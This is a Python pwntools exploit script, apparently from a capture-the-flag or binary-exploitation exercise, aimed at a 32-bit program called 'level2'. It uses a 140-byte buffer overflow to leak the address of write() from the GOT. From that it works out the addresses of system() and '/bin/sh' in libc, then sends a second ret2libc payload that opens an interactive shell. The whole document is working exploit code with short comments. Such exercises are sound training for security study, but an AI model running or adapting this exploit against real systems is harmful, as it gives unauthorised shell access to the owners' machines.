##prerequisite
# 1. write is called, since need to call write@plt to print out write_got.
# 2. have libc, since need to calculate offset for system and 'bin/sh' from write/read
#!/usr/bin/env python
from pwn import *

libc = ELF('/lib32/libc.so.6')
elf = ELF('level2')

p = process('./level2')
#p = remote('127.0.0.1', 10003)

plt_write = elf.symbols['write']
print 'plt_write= ' + hex(plt_write)
got_write = elf.got['write'] #could use read also, since read has also been called
print 'got_write= ' + hex(got_write)
vulfun_addr = elf.symbols['vulnerable_function']
print 'vulfun= ' + hex(vulfun_addr)

# write(STDOUT, &write@got, 4)
payload1 = 'a'*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(got_write) + p32(4)

print "\n###sending payload1 ...###"
p.send(payload1)

print "\n###receving write() addr...###"
write_addr = u32(p.recv(4))
print 'write_addr=' + hex(write_addr)

print "\n###calculating system() addr and \"/bin/sh\" addr...###"
system_addr = write_addr - (libc.symbols['write'] - libc.symbols['system'])
print 'system_addr= ' + hex(system_addr)
binsh_addr = write_addr - (libc.symbols['write'] - next(libc.search('/bin/sh')))
print 'binsh_addr= ' + hex(binsh_addr)

payload2 = 'a'*140  + p32(system_addr) + p32(vulfun_addr) + p32(binsh_addr)

print "\n###sending payload2 ...###"
p.send(payload2)

p.interactive()

